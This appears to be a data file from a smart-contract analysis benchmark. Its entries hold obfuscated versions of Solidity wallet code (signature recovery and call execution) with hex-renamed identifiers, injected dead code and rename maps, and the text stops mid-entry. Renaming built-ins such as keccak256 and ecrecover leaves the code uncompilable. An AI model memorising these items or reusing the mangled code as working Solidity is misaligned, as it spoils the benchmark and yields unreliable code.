        "safeTransferFrom": "_0xc7ef98",
        "allocatorService": "_0x593759",
        "initiatorService": "_0x151608",
        "totalControlled": "_0x99d03a",
        "amountDeposited": "_0x88c0f7",
        "liquidityBuffer": "_0x502a5b",
        "depositContract": "_0x9b4523",
        "expectedMinimum": "_0xfefec6",
        "_unstakeRequest": "_0x34fe73",
        "isStakingPaused": "_0x798145",
        "depositDataRoot": "_0xa5e01e",
        "unallocatedETH": "_0xf47e45",
        "notZeroAddress": "_0xd0ec9b",
        "receiveReturns": "_0x440dbf",
        "usedValidators": "_0x52dc92",
        "mETHMintAmount": "_0x9ee493",
        "unstakeRequest": "_0xf15e2b",
        "minMETHAmount": "_0x878d12",
        "depositAmount": "_0xd71f78",
        "_setRoleAdmin": "_0xa43946",
        "reinitializer": "_0xb924c6",
        "latestRecord": "_0x3473ac",
        "ethRequested": "_0x58e310",
        "minETHAmount": "_0x047864",
        "initializeV2": "_0x7b5ec3",
        "totalSupply": "_0x0c8146",
        "initializer": "_0x0b4734",
        "_checkRole": "_0x3d4cbd",
        "mETHAmount": "_0xc56d11",
        "operatorID": "_0x837c32",
        "methAmount": "_0x90fba2",
        "_grantRole": "_0x4d13d6",
        "mETHLocked": "_0x9490a4",
        "safePermit": "_0x2507b4",
        "initialize": "_0xc4c60b",
        "requestID": "_0x5b1979",
        "signature": "_0xa1600f",
        "ethToMETH": "_0xfe089e",
        "requester": "_0xff1346",
        "mETHToETH": "_0x704398",
        "keccak256": "_0x20d2bb",
        "ethAmount": "_0x53c769",
        "deadline": "_0x924a31",
        "manager": "_0x3f6c35",
        "staker": "_0xf36c60",
        "exists": "_0x9a7831",
        "mulDiv": "_0x65932d",
        "record": "_0x70f217",
        "pauser": "_0x4eb005",
        "oracle": "_0x801ff9",
        "create": "_0x8a24c1",
        "amount": "_0xb7ef25",
        "pubkey": "_0x6ea894",
        "admin": "_0x140228",
        "total": "_0xa78a3b",
        "stake": "_0x281b68",
        "addr": "_0x9fda54",
        "init": "_0x4ab01d",
        "mETH": "_0x49bbf9",
        "mint": "_0x7afe00",
        "id": "_0xb01550",
        "lb": "_0xeeed28"
      },
      "changes": [
        "Renamed 91 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_029",
      "transformed_id": "ss_l4_medium_sn_gs_029",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.27;\n\nimport { LibBytes } from \"../../utils/LibBytes.sol\";\nimport { LibOptim } from \"../../utils/LibOptim.sol\";\nimport { Payload } from \"../Payload.sol\";\n\nimport { ICheckpointer, Snapshot } from \"../interfaces/ICheckpointer.sol\";\nimport { IERC1271, IERC1271_MAGIC_VALUE_HASH } from \"../interfaces/IERC1271.sol\";\nimport { ISapient, ISapientCompact } from \"../interfaces/ISapient.sol\";\n\nusing LibBytes for bytes;\nusing Payload for Payload.Decoded;\n\n/// @title BaseSig\n/// @author Agustin Aguilar, Michael Standen, William Hua, Shun Kakinoki\n/// @notice Library for recovering signatures from the base-auth payload\nlibrary BaseSig {\n\n  uint256 internal constant FLAG_SIGNATURE_HASH = 0;\n  uint256 internal constant FLAG_ADDRESS = 1;\n  uint256 internal constant FLAG_SIGNATURE_ERC1271 = 2;\n  uint256 internal constant FLAG_NODE = 3;\n  uint256 internal constant FLAG_BRANCH = 4;\n  uint256 internal constant FLAG_SUBDIGEST = 5;\n  uint256 internal constant FLAG_NESTED = 6;\n  uint256 internal constant FLAG_SIGNATURE_ETH_SIGN = 7;\n  uint256 internal constant FLAG_SIGNATURE_ANY_ADDRESS_SUBDIGEST = 8;\n  uint256 internal constant FLAG_SIGNATURE_SAPIENT = 9;\n  uint256 internal constant FLAG_SIGNATURE_SAPIENT_COMPACT = 10;\n\n  /// @notice Error thrown when the weight is too low for a chained signature\n  error LowWeightChainedSignature(bytes _0x485c28, uint256 _0x821be8, uint256 _0xaa245f);\n  /// @notice Error thrown when the ERC1271 signature is invalid\n  error InvalidERC1271Signature(bytes32 _0xce8606, address _0x8271bc, bytes _0x485c28);\n  /// @notice Error thrown when the checkpoint order is wrong\n  error WrongChainedCheckpointOrder(uint256 _0x4f67f7, uint256 _0xc2864a);\n  /// @notice Error thrown when the snapshot is unused\n  error UnusedSnapshot(Snapshot _0xeff70d);\n  /// @notice Error thrown when the signature flag is invalid\n  error InvalidSignatureFlag(uint256 _0xfa82b5);\n\n  function _0xbfe1a0(address _0xb7c416, uint256 _0xaa245f) internal pure returns (bytes32) {\n        bool _flag1 = false;\n        // Placeholder for future logic\n    return _0x8c6c8e(abi._0x5e2b7c(\"Sequence signer:\\n\", _0xb7c416, _0xaa245f));\n  }\n\n  function _0x16580c(bytes32 _0xc22f06, uint256 _0x821be8, uint256 _0xaa245f) internal pure returns (bytes32) {\n        bool _flag3 = false;\n        // Placeholder for future logic\n    return _0x8c6c8e(abi._0x5e2b7c(\"Sequence nested config:\\n\", _0xc22f06, _0x821be8, _0xaa245f));\n  }\n\n  function _0x4a24cb(address _0xb7c416, uint256 _0xaa245f, bytes32 _0x837e0c) internal pure returns (bytes32) {\n    return _0x8c6c8e(abi._0x5e2b7c(\"Sequence sapient config:\\n\", _0xb7c416, _0xaa245f, _0x837e0c));\n  }\n\n  function _0x1ea614(\n    bytes32 _0x5fb511\n  ) internal pure returns (bytes32) {\n    return _0x8c6c8e(abi._0x5e2b7c(\"Sequence static digest:\\n\", _0x5fb511));\n  }\n\n  function _0xd51f80(\n    bytes32 _0xee2ffc\n  ) internal pure returns (bytes32) {\n    return _0x8c6c8e(abi._0x5e2b7c(\"Sequence any address subdigest:\\n\", _0xee2ffc));\n  }\n\n  function _0x125050(\n    Payload.Decoded memory _0xb4c39c,\n    bytes calldata _0x485c28,\n    bool _0x94809c,\n    address _0x6e4f82\n  ) internal view returns (uint256 _0xa5623c, uint256 _0x77424f, bytes32 _0x0d6771, uint256 _0x65204a, bytes32 _0x0c23a9) {\n    // First byte is the signature flag\n    (uint256 _0x43735a, uint256 _0xabc74b) = _0x485c28._0xaa1db4();\n\n    // The possible flags are:\n    // - 0000 00XX (bits [1..0]): signature type (00 = normal, 01/11 = chained, 10 = no chain id)\n    // - 000X XX00 (bits [4..2]): checkpoint size (00 = 0 bytes, 001 = 1 byte, 010 = 2 bytes...)\n    // - 00X0 0000 (bit [5]): threshold size (0 = 1 byte, 1 = 2 bytes)\n    // - 0X00 0000 (bit [6]): set if imageHash checkpointer is used\n    // - X000 0000 (bit [7]): reserved by base-auth\n\n    Snapshot memory _0x0486b2;\n\n    // Recover the imageHash checkpointer if any\n    // but checkpointer passed as argument takes precedence\n    // since it can be defined by the chained signatures\n    if (_0x43735a & 0x40 == 0x40 && _0x6e4f82 == address(0)) {\n      // Override the checkpointer\n      // not ideal, but we don't have much room in the stack\n      (_0x6e4f82, _0xabc74b) = _0x485c28._0x92a547(_0xabc74b);\n\n      if (!_0x94809c) {\n        // Next 3 bytes determine the checkpointer data size\n        uint256 _0x92830e;\n        (_0x92830e, _0xabc74b) = _0x485c28._0xfdb3ea(_0xabc74b);\n\n        // Read the checkpointer data\n        bytes memory _0xeb7694 = _0x485c28[_0xabc74b:_0xabc74b + _0x92830e];\n\n        // Call the middleware\n        _0x0486b2 = ICheckpointer(_0x6e4f82)._0xf91d7f(address(this), _0xeb7694);\n\n        _0xabc74b += _0x92830e;\n      }\n    }\n\n    // If signature type is 01 or 11 we do a chained signature\n    if (_0x43735a & 0x01 == 0x01) {\n      return _0x041b3c(_0xb4c39c, _0x6e4f82, _0x0486b2, _0x485c28[_0xabc74b:]);\n    }\n\n    // If the signature type is 10 we do a no chain id signature\n    _0xb4c39c._0x253062 = _0x43735a & 0x02 == 0x02;\n\n    {\n      // Recover the checkpoint using the size defined by the flag\n      uint256 _0x0c4df4 = (_0x43735a & 0x1c) >> 2;\n      (_0x65204a, _0xabc74b) = _0x485c28._0xd558da(_0xabc74b, _0x0c4df4);\n    }\n\n    // Recover the threshold, using the flag for the size\n    {\n      uint256 _0x3a06a6 = ((_0x43735a & 0x20) >> 5) + 1;\n      (_0xa5623c, _0xabc74b) = _0x485c28._0xd558da(_0xabc74b, _0x3a06a6);\n    }\n\n    // Recover the tree\n    _0x0c23a9 = _0xb4c39c._0x84f78f();\n    (_0x77424f, _0x0d6771) = _0x9fd1bf(_0xb4c39c, _0x0c23a9, _0x485c28[_0xabc74b:]);\n\n    _0x0d6771 = LibOptim._0x443a83(_0x0d6771, bytes32(_0xa5623c));\n    _0x0d6771 = LibOptim._0x443a83(_0x0d6771, bytes32(_0x65204a));\n    _0x0d6771 = LibOptim._0x443a83(_0x0d6771, bytes32(uint256(uint160(_0x6e4f82))));\n\n    // If the snapshot is used, either the imageHash must match\n    // or the checkpoint must be greater than the snapshot checkpoint\n    if (_0x0486b2._0x0d6771 != bytes32(0) && _0x0486b2._0x0d6771 != _0x0d6771 && _0x65204a <= _0x0486b2._0x65204a) {\n      revert UnusedSnapshot(_0x0486b2);\n    }\n  }\n\n  function _0x041b3c(\n    Payload.Decoded memory _0xb4c39c,\n    address _0x6e4f82,\n    Snapshot memory _0xeff70d,\n    bytes calldata _0x485c28\n  ) internal view returns (uint256 _0xa5623c, uint256 _0x77424f, bytes32 _0x0d6771, uint256 _0x65204a, bytes32 _0x0c23a9) {\n    Payload.Decoded memory _0xec3626;\n    _0xec3626._0x658f3b = Payload.KIND_CONFIG_UPDATE;\n\n    uint256 _0xabc74b;\n    uint256 _0x87f2e1 = type(uint256)._0xbef178;\n\n    while (_0xabc74b < _0x485c28.length) {\n      uint256 _0xff14a3;\n\n      {\n        uint256 _0x168f8c;\n        (_0x168f8c, _0xabc74b) = _0x485c28._0xfdb3ea(_0xabc74b);\n        _0xff14a3 = _0x168f8c + _0xabc74b;\n      }\n\n      address _0xbfe396 = _0xff14a3 == _0x485c28.length ? _0x6e4f82 : address(0);\n\n      if (_0x87f2e1 == type(uint256)._0xbef178) {\n        (_0xa5623c, _0x77424f, _0x0d6771, _0x65204a, _0x0c23a9) =\n          _0x125050(_0xb4c39c, _0x485c28[_0xabc74b:_0xff14a3], true, _0xbfe396);\n      } else {\n        (_0xa5623c, _0x77424f, _0x0d6771, _0x65204a,) =\n          _0x125050(_0xec3626, _0x485c28[_0xabc74b:_0xff14a3], true, _0xbfe396);\n      }\n\n      if (_0x77424f < _0xa5623c) {\n        revert LowWeightChainedSignature(_0x485c28[_0xabc74b:_0xff14a3], _0xa5623c, _0x77424f);\n      }\n      _0xabc74b = _0xff14a3;\n\n      if (_0xeff70d._0x0d6771 == _0x0d6771) {\n        _0xeff70d._0x0d6771 = bytes32(0);\n      }\n\n      if (_0x65204a >= _0x87f2e1) {\n        revert WrongChainedCheckpointOrder(_0x65204a, _0x87f2e1);\n      }\n\n      _0xec3626._0x0d6771 = _0x0d6771;\n      _0x87f2e1 = _0x65204a;\n    }\n\n    if (_0xeff70d._0x0d6771 != bytes32(0) && _0x65204a <= _0xeff70d._0x65204a) {\n      revert UnusedSnapshot(_0xeff70d);\n    }\n  }\n\n  function _0x9fd1bf(\n    Payload.Decoded memory _0xb4c39c,\n    bytes32 _0xce8606,\n    bytes calldata _0x485c28\n  ) internal view returns (uint256 _0x77424f, bytes32 _0x3ed99a) {\n    unchecked {\n      uint256 _0xabc74b;\n\n      // Iterate until the image is completed\n      while (_0xabc74b < _0x485c28.length) {\n        // The first byte is half flag (the top nibble)\n        // and the second set of 4 bits can freely be used by the part\n\n        // Read next item type\n        uint256 _0x724171;\n        (_0x724171, _0xabc74b) = _0x485c28._0x856e39(_0xabc74b);\n\n        // The top 4 bits are the flag\n        uint256 _0xe72026 = (_0x724171 & 0xf0) >> 4;\n\n        // Signature hash (0x00)\n        if (_0xe72026 == FLAG_SIGNATURE_HASH) {\n          // Free bits layout:\n          // - bits [3..0]: Weight (0000 = dynamic, 0001 = 1, ..., 1111 = 15)\n          // We read 64 bytes for an ERC-2098 compact signature (r, yParityAndS).\n          // The top bit of yParityAndS is yParity, the remaining 255 bits are s.\n\n          uint8 _0x635bdb = uint8(_0x724171 & 0x0f);\n          if (_0x635bdb == 0) {\n            (_0x635bdb, _0xabc74b) = _0x485c28._0x856e39(_0xabc74b);\n          }\n\n          bytes32 r;\n          bytes32 s;\n          uint8 v;\n          (r, s, v, _0xabc74b) = _0x485c28._0xd76b1d(_0xabc74b);\n\n          address _0x1a6584 = _0x01809b(_0xce8606, v, r, s);\n\n          _0x77424f += _0x635bdb;\n          bytes32 _0x3f119c = _0xbfe1a0(_0x1a6584, _0x635bdb);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Address (0x01) (without signature)\n        if (_0xe72026 == FLAG_ADDRESS) {\n          // Free bits layout:\n          // - bits [3..0]: Weight (0000 = dynamic, 0001 = 1, 0010 = 2, ...)\n\n          // Read weight\n          uint8 _0x635bdb = uint8(_0x724171 & 0x0f);\n          if (_0x635bdb == 0) {\n            (_0x635bdb, _0xabc74b) = _0x485c28._0x856e39(_0xabc74b);\n          }\n\n          // Read address\n          address _0x1a6584;\n          (_0x1a6584, _0xabc74b) = _0x485c28._0x92a547(_0xabc74b);\n\n          // Compute the merkle root WITHOUT adding the weight\n          bytes32 _0x3f119c = _0xbfe1a0(_0x1a6584, _0x635bdb);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Signature ERC1271 (0x02)\n        if (_0xe72026 == FLAG_SIGNATURE_ERC1271) {\n          // Free bits layout:\n          // - XX00 : Signature size size (00 = 0 byte, 01 = 1 byte, 10 = 2 bytes, 11 = 3 bytes)\n          // - 00XX : Weight (00 = dynamic, 01 = 1, 10 = 2, 11 = 3)\n\n          // Read weight\n          uint8 _0x635bdb = uint8(_0x724171 & 0x03);\n          if (_0x635bdb == 0) {\n            (_0x635bdb, _0xabc74b) = _0x485c28._0x856e39(_0xabc74b);\n          }\n\n          // Read signer\n          address _0x1a6584;\n          (_0x1a6584, _0xabc74b) = _0x485c28._0x92a547(_0xabc74b);\n\n          // Read signature size\n          uint256 _0x371522 = uint8(_0x724171 & 0x0c) >> 2;\n          uint256 _0x168144;\n          (_0x168144, _0xabc74b) = _0x485c28._0xd558da(_0xabc74b, _0x371522);\n\n          // Read dynamic size signature\n          uint256 _0xff14a3 = _0xabc74b + _0x168144;\n\n          // Call the ERC1271 contract to check if the signature is valid\n          if (IERC1271(_0x1a6584)._0xd05bf3(_0xce8606, _0x485c28[_0xabc74b:_0xff14a3]) != IERC1271_MAGIC_VALUE_HASH) {\n            revert InvalidERC1271Signature(_0xce8606, _0x1a6584, _0x485c28[_0xabc74b:_0xff14a3]);\n          }\n          _0xabc74b = _0xff14a3;\n          // Add the weight and compute the merkle root\n          _0x77424f += _0x635bdb;\n          bytes32 _0x3f119c = _0xbfe1a0(_0x1a6584, _0x635bdb);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Node (0x03)\n        if (_0xe72026 == FLAG_NODE) {\n          // Free bits left unused\n\n          // Read node hash\n          bytes32 _0x3f119c;\n          (_0x3f119c, _0xabc74b) = _0x485c28._0xbbe3d1(_0xabc74b);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Branch (0x04)\n        if (_0xe72026 == FLAG_BRANCH) {\n          // Free bits layout:\n          // - XXXX : Size size (0000 = 0 byte, 0001 = 1 byte, 0010 = 2 bytes, ...)\n\n          // Read size\n          uint256 _0x371522 = uint8(_0x724171 & 0x0f);\n          uint256 _0x168144;\n          (_0x168144, _0xabc74b) = _0x485c28._0xd558da(_0xabc74b, _0x371522);\n\n          // Enter a branch of the signature merkle tree\n          uint256 _0xff14a3 = _0xabc74b + _0x168144;\n\n          (uint256 _0x912a68, bytes32 _0x3f119c) = _0x9fd1bf(_0xb4c39c, _0xce8606, _0x485c28[_0xabc74b:_0xff14a3]);\n          _0xabc74b = _0xff14a3;\n\n          _0x77424f += _0x912a68;\n          _0x3ed99a = LibOptim._0x443a83(_0x3ed99a, _0x3f119c);\n          continue;\n        }\n\n        // Nested (0x06)\n        if (_0xe72026 == FLAG_NESTED) {\n          // Unused free bits:\n          // - XX00 : Weight (00 = dynamic, 01 = 1, 10 = 2, 11 = 3)\n          // - 00XX : Threshold (00 = dynamic, 01 = 1, 10 = 2, 11 = 3)\n\n          // Enter a branch of the signature merkle tree\n          // but with an internal threshold and an external fixed weight\n          uint256 _0x57106e = uint8(_0x724171 & 0x0c) >> 2;\n          if (_0x57106e == 0) {\n            (_0x57106e, _0xabc74b) = _0x485c28._0x856e39(_0xabc74b);\n          }\n\n          uint256 _0xe572c9 = uint8(_0x724171 & 0x03);\n          if (_0xe572c9 == 0) {\n            (_0xe572c9, _0xabc74b) = _0x485c28._0xf15eee(_0xabc74b);\n          }\n\n          uint256 _0x168144;\n          (_0x168144, _0xabc74b) = _0x485c28._0xfdb3ea(_0xabc74b);\n          uint256 _0xff14a3 = _0xabc74b + _0x168144;\n\n          (uint256 _0xc11371, bytes32 _0x0fbaf8) = _0x9fd1bf(_0xb4c39c, _0xce8606, _0x485c28[_0xabc74b:_0xff14a3]);\n          _0xabc74b = _0xff14a3;\n\n          if (_0xc11371 >= _0xe572c9) {\n            _0x77424f += _0x57106e;\n          }\n\n          bytes32 _0x3f119c = _0x16580c(_0x0fbaf8, _0xe572c9, _0x57106e);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Subdigest (0x05)\n        if (_0xe72026 == FLAG_SUBDIGEST) {\n          // Free bits left unused\n\n          // A hardcoded always accepted digest\n          // it pushes the weight to the maximum\n          bytes32 _0xfdf11c;\n          (_0xfdf11c, _0xabc74b) = _0x485c28._0xbbe3d1(_0xabc74b);\n          if (_0xfdf11c == _0xce8606) {\n            _0x77424f = type(uint256)._0xbef178;\n          }\n\n          bytes32 _0x3f119c = _0x1ea614(_0xfdf11c);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Signature ETH Sign (0x07)\n        if (_0xe72026 == FLAG_SIGNATURE_ETH_SIGN) {\n          // Free bits layout:\n          // - bits [3..0]: Weight (0000 = dynamic, 0001 = 1, ..., 1111 = 15)\n          // We read 64 bytes for an ERC-2098 compact signature (r, yParityAndS).\n          // The top bit of yParityAndS is yParity, the remaining 255 bits are s.\n\n          uint8 _0x635bdb = uint8(_0x724171 & 0x0f);\n          if (_0x635bdb == 0) {\n            (_0x635bdb, _0xabc74b) = _0x485c28._0x856e39(_0xabc74b);\n          }\n\n          bytes32 r;\n          bytes32 s;\n          uint8 v;\n          (r, s, v, _0xabc74b) = _0x485c28._0xd76b1d(_0xabc74b);\n\n          address _0x1a6584 = _0x01809b(_0x8c6c8e(abi._0x5e2b7c(\"\\x19Ethereum Signed Message:\\n32\", _0xce8606)), v, r, s);\n\n          _0x77424f += _0x635bdb;\n          bytes32 _0x3f119c = _0xbfe1a0(_0x1a6584, _0x635bdb);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Signature Any address subdigest (0x08)\n        // similar to subdigest, but allows for counter-factual payloads\n        if (_0xe72026 == FLAG_SIGNATURE_ANY_ADDRESS_SUBDIGEST) {\n          // Free bits left unused\n\n          // A hardcoded always accepted digest\n          // it pushes the weight to the maximum\n          bytes32 _0xfdf11c;\n          (_0xfdf11c, _0xabc74b) = _0x485c28._0xbbe3d1(_0xabc74b);\n          bytes32 _0x8aa93c = _0xb4c39c._0xe26c97(address(0));\n          if (_0xfdf11c == _0x8aa93c) {\n            _0x77424f = type(uint256)._0xbef178;\n          }\n\n          bytes32 _0x3f119c = _0xd51f80(_0xfdf11c);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Signature Sapient (0x09)\n        if (_0xe72026 == FLAG_SIGNATURE_SAPIENT) {\n          // Free bits layout:\n          // - XX00 : Signature size size (00 = 0 byte, 01 = 1 byte, 10 = 2 bytes, 11 = 3 bytes)\n          // - 00XX : Weight (00 = dynamic, 01 = 1, 10 = 2, 11 = 3)\n\n          // Read signer and weight\n          uint8 _0x635bdb = uint8(_0x724171 & 0x03);\n          if (_0x635bdb == 0) {\n            (_0x635bdb, _0xabc74b) = _0x485c28._0x856e39(_0xabc74b);\n          }\n\n          address _0x1a6584;\n          (_0x1a6584, _0xabc74b) = _0x485c28._0x92a547(_0xabc74b);\n\n          // Read signature size\n          uint256 _0x168144;\n          {\n            uint256 _0x371522 = uint8(_0x724171 & 0x0c) >> 2;\n            (_0x168144, _0xabc74b) = _0x485c28._0xd558da(_0xabc74b, _0x371522);\n          }\n\n          // Read dynamic size signature\n          uint256 _0xff14a3 = _0xabc74b + _0x168144;\n\n          // Call the ERC1271 contract to check if the signature is valid\n          bytes32 _0xb2f0d4 = ISapient(_0x1a6584)._0xedf3f3(_0xb4c39c, _0x485c28[_0xabc74b:_0xff14a3]);\n          _0xabc74b = _0xff14a3;\n\n          // Add the weight and compute the merkle root\n          _0x77424f += _0x635bdb;\n          bytes32 _0x3f119c = _0x4a24cb(_0x1a6584, _0x635bdb, _0xb2f0d4);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        // Signature Sapient Compact (0x0A)\n        if (_0xe72026 == FLAG_SIGNATURE_SAPIENT_COMPACT) {\n          // Free bits layout:\n          // - XX00 : Signature size size (00 = 0 byte, 01 = 1 byte, 10 = 2 bytes, 11 = 3 bytes)\n          // - 00XX : Weight (00 = dynamic, 01 = 1, 10 = 2, 11 = 3)\n\n          // Read signer and weight\n          uint8 _0x635bdb = uint8(_0x724171 & 0x03);\n          if (_0x635bdb == 0) {\n            (_0x635bdb, _0xabc74b) = _0x485c28._0x856e39(_0xabc74b);\n          }\n\n          address _0x1a6584;\n          (_0x1a6584, _0xabc74b) = _0x485c28._0x92a547(_0xabc74b);\n\n          // Read signature size\n          uint256 _0x371522 = uint8(_0x724171 & 0x0c) >> 2;\n          uint256 _0x168144;\n          (_0x168144, _0xabc74b) = _0x485c28._0xd558da(_0xabc74b, _0x371522);\n\n          // Read dynamic size signature\n          uint256 _0xff14a3 = _0xabc74b + _0x168144;\n\n          // Call the Sapient contract to check if the signature is valid\n          bytes32 _0xb2f0d4 =\n            ISapientCompact(_0x1a6584)._0xe7d04c(_0xce8606, _0x485c28[_0xabc74b:_0xff14a3]);\n          _0xabc74b = _0xff14a3;\n          // Add the weight and compute the merkle root\n          _0x77424f += _0x635bdb;\n          bytes32 _0x3f119c = _0x4a24cb(_0x1a6584, _0x635bdb, _0xb2f0d4);\n          _0x3ed99a = _0x3ed99a != bytes32(0) ? LibOptim._0x443a83(_0x3ed99a, _0x3f119c) : _0x3f119c;\n          continue;\n        }\n\n        revert InvalidSignatureFlag(_0xe72026);\n      }\n    }\n  }\n\n}",
      "rename_map": {
        "recoverSapientSignatureCompact": "_0xe7d04c",
        "_leafForAnyAddressSubdigest": "_0xd51f80",
        "_leafForHardcodedSubdigest": "_0x1ea614",
        "_leafForAddressAndWeight": "_0xbfe1a0",
        "recoverSapientSignature": "_0xedf3f3",
        "_anyAddressSubdigest": "_0xee2ffc",
        "checkpointerDataSize": "_0x92830e",
        "_ignoreCheckpointer": "_0x94809c",
        "internalThreshold": "_0xe572c9",
        "checkpointerData": "_0xeb7694",
        "anyAddressOpHash": "_0x8aa93c",
        "isValidSignature": "_0xd05bf3",
        "sapientImageHash": "_0xb2f0d4",
        "_leafForSapient": "_0x4a24cb",
        "_nextCheckpoint": "_0x4f67f7",
        "prevCheckpoint": "_0x87f2e1",
        "readFirstUint8": "_0xaa1db4",
        "recoverChained": "_0x041b3c",
        "readRSVCompact": "_0xd76b1d",
        "checkpointSize": "_0x0c4df4",
        "externalWeight": "_0x57106e",
        "_leafForNested": "_0x16580c",
        "internalWeight": "_0xc11371",
        "signatureFlag": "_0x43735a",
        "thresholdSize": "_0x3a06a6",
        "recoverBranch": "_0x9fd1bf",
        "_checkpointer": "_0x6e4f82",
        "linkedPayload": "_0xec3626",
        "encodePacked": "_0x5e2b7c",
        "internalRoot": "_0x0fbaf8",
        "checkpointer": "_0xbfe396",
        "snapshotFor": "_0xf91d7f",
        "_checkpoint": "_0xc2864a",
        "readBytes32": "_0xbbe3d1",
        "readAddress": "_0x92a547",
        "readUint16": "_0xf15eee",
        "readUint24": "_0xfdb3ea",
        "_subdigest": "_0x5fb511",
        "checkpoint": "_0x65204a",
        "_imageHash": "_0x837e0c",
        "_signature": "_0x485c28",
        "addrWeight": "_0x635bdb",
        "fkeccak256": "_0x443a83",
        "_threshold": "_0x821be8",
        "firstByte": "_0x724171",
        "readUint8": "_0x856e39",
        "threshold": "_0xa5623c",
        "_snapshot": "_0xeff70d",
        "imageHash": "_0x0d6771",
        "readUintX": "_0xd558da",
        "hardcoded": "_0xfdf11c",
        "noChainId": "_0x253062",
        "ecrecover": "_0x01809b",
        "keccak256": "_0x8c6c8e",
        "sizeSize": "_0x371522",
        "_payload": "_0xb4c39c",
        "snapshot": "_0x0486b2",
        "nrindex": "_0xff14a3",
        "_weight": "_0xaa245f",
        "nweight": "_0x912a68",
        "_signer": "_0x8271bc",
        "_opHash": "_0xce8606",
        "sigSize": "_0x168f8c",
        "recover": "_0x125050",
        "hashFor": "_0xe26c97",
        "weight": "_0x77424f",
        "rindex": "_0xabc74b",
        "opHash": "_0x0c23a9",
        "_node": "_0xc22f06",
        "_addr": "_0xb7c416",
        "_flag": "_0xfa82b5",
        "addr": "_0x1a6584",
        "size": "_0x168144",
        "root": "_0x3ed99a",
        "hash": "_0x84f78f",
        "kind": "_0x658f3b",
        "node": "_0x3f119c",
        "flag": "_0xe72026",
        "max": "_0xbef178"
      },
      "changes": [
        "Renamed 79 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_gs_030",
      "transformed_id": "ss_l4_medium_sn_gs_030",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: Apache-2.0\npragma solidity ^0.8.27;\n\nimport { LibOptim } from \"../utils/LibOptim.sol\";\nimport { Nonce } from \"./Nonce.sol\";\nimport { Payload } from \"./Payload.sol\";\n\nimport { ReentrancyGuard } from \"./ReentrancyGuard.sol\";\nimport { BaseAuth } from \"./auth/BaseAuth.sol\";\nimport { IDelegatedExtension } from \"./interfaces/IDelegatedExtension.sol\";\n\n/// @title Calls\n/// @author Agustin Aguilar, Michael Standen, William Hua\n/// @notice Contract for executing calls\nabstract contract Calls is ReentrancyGuard, BaseAuth, Nonce {\n\n  /// @notice Emitted when a call succeeds\n  event CallSucceeded(bytes32 _0xf65185, uint256 _0x69ee16);\n  /// @notice Emitted when a call fails\n  event CallFailed(bytes32 _0xf65185, uint256 _0x69ee16, bytes _0x48dcdf);\n  /// @notice Emitted when a call is aborted\n  event CallAborted(bytes32 _0xf65185, uint256 _0x69ee16, bytes _0x48dcdf);\n  /// @notice Emitted when a call is skipped\n  event CallSkipped(bytes32 _0xf65185, uint256 _0x69ee16);\n\n  /// @notice Error thrown when a call reverts\n  error Reverted(Payload.Decoded _0xb288bd, uint256 _0x69ee16, bytes _0x48dcdf);\n  /// @notice Error thrown when a signature is invalid\n  error InvalidSignature(Payload.Decoded _0xb288bd, bytes _0xeb831e);\n  /// @notice Error thrown when there is not enough gas\n  error NotEnoughGas(Payload.Decoded _0xb288bd, uint256 _0x69ee16, uint256 _0x0e1fdf);\n\n  /// @notice Execute a call\n  /// @param _payload The payload\n  /// @param _signature The signature\n  function _0xeebec5(bytes calldata _0xb288bd, bytes calldata _0xeb831e) external payable virtual _0xbb23e8 {\n        if (false) { revert(); }\n        if (false) { revert(); }\n    uint256 _0xfaa3c1 = _0xf73c4d();\n    Payload.Decoded memory _0x9a7cb4 = Payload._0x3f0090(_0xb288bd);\n\n    _0x46e82a(_0x9a7cb4._0x214d86, _0x9a7cb4._0xc176a7);\n    (bool _0x68f73e, bytes32 _0x08f0ed) = _0x3ffb68(_0x9a7cb4, _0xeb831e);\n\n    if (!_0x68f73e) {\n      revert InvalidSignature(_0x9a7cb4, _0xeb831e);\n    }\n\n    _0x5df043(_0xfaa3c1, _0x08f0ed, _0x9a7cb4);\n  }\n\n  /// @notice Execute a call\n  /// @dev Callable only by the contract itself\n  /// @param _payload The payload\n  function _0x199454(\n    bytes calldata _0xb288bd\n  ) external payable virtual _0x78f336 {\n        bool _flag3 = false;\n        // Placeholder for future logic\n    uint256 _0xfaa3c1 = _0xf73c4d();\n    Payload.Decoded memory _0x9a7cb4 = Payload._0x3f0090(_0xb288bd);\n    bytes32 _0x08f0ed = Payload._0xb60971(_0x9a7cb4);\n    _0x5df043(_0xfaa3c1, 